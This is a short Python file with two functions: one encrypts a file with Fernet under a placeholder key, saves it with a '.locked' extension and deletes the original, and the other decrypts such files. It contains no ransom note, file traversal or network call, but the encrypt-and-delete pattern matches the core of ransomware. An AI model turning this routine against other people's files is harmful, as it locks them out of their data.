import os
import ctypes
from cryptography.fernet import Fernet

key = b'INSERT_KEY_HERE'


def encrypt_file(file_path):
    if file_path.endswith('.locked'):
        print(f"{file_path} is already encrypted, skipping.")
        return
    with open(file_path, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(file_path + '.locked', 'wb') as f:
        f.write(encrypted)

    os.remove(file_path)
    print(f"{file_path} has been encrypted and locked.")


def decrypt_file(file_path):
    if not file_path.endswith('.locked'):
        print(f"{file_path} is not encrypted, skipping.")
        return
    with open(file_path, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(file_path[:-7], 'wb') as f:
        f.write(decrypted)

    os.remove(file_path)
    print(f"{file_path} has been decrypted and unlocked.")
